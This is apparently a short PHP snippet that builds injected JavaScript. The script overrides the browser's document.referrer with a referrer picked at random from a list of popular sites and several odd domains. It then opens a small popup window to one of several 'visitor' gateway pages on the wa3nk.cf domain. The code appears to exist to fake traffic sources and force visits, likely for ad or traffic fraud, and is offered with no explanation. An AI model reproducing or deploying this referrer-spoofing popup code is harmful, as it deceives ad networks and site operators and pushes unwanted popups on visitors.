<?
$referral_url = array("google.com", "bing.com", "facebook.com", "m.facebook.com", "l3n4r0x.ga", "l3n4r0x.blogspot.com", "youtube.com", "twitter.com", "pinterest.com", " www.wa3nk.cf", " l3n4r0x.heck.in", "instagram.com", "tinyurl.com", "stackoverflow.com"); 
$referral_ran = array_rand($referral_url);
$selected_referral = "http://www.".$referral_url[$referral_ran];

$gateway_url = array("ads.wa3nk.cf/visitor/lama/index-tr.php", "www.wa3nk.cf/visitor/lama/6-tr.php",  "web.wa3nk.cf/visitor/lama/7-tr.php", "wa3nk.cf/visitor/lama/8-tr.php", "q.gs.wa3nk.cf/visitor/lama/9-tr.php");
$gateway_ran = array_rand($gateway_url);
$selected_gateway = "http://".$gateway_url[$gateway_ran];

$display_block = '<script>
delete window.document.referrer;
window.document.__defineGetter__("referrer", function () {
return "'.$selected_referral.'";
});
var myWindow = window.open("'.$selected_gateway.'", "myWindow", "width=500, height=50");
</script>';
?>